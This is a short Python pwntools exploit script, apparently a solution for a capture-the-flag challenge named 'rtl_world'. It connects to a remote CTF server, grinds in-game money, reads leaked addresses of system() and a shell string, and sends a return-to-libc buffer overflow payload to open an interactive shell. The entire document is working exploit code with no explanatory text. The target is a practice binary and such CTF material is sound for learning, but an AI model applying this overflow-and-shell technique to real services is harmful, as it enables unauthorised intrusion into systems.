from pwn import *

def makeMoney(p, money=1000, need=5000):
	while money<need:
		p.sendline('2')	# Make Money
		p.sendline('3')	# Hunting
		p.recvuntil('Gold is ')
		money = int(p.recv(4))
		p.recvuntil('>>> ')

def getSystem(p):
	p.sendline('3')
	p.recvuntil(': ')
	system = int(p.recvuntil('\n').replace('\n',''),16)
	print p.recvuntil('>>> ')
	
	return system

def getShell(p):
	p.sendline('4')
	p.recvuntil(': ')
	shell = int(p.recvuntil('\n').replace('\n',''),16)
	print p.recvuntil('>>> ')
	
	return shell

def main():
	p = remote("ctf.j0n9hyun.xyz", 3010)
#p = process('./rtl_world')

	print p.recv()
	makeMoney(p) # until 5000 money
	system = getSystem(p)
	shell = getShell(p)

	log.info('system = %#x, shell = %#x' % (system, shell))

	p.sendline('5')

	payload = ''
	payload += 'a'*0x8c + 'b'*4
	payload += p32(system)
	payload += '\x90'*4
	payload += p32(shell)
	
	p.sendline(payload)
	
	p.interactive()

if __name__ == "__main__":
	main()

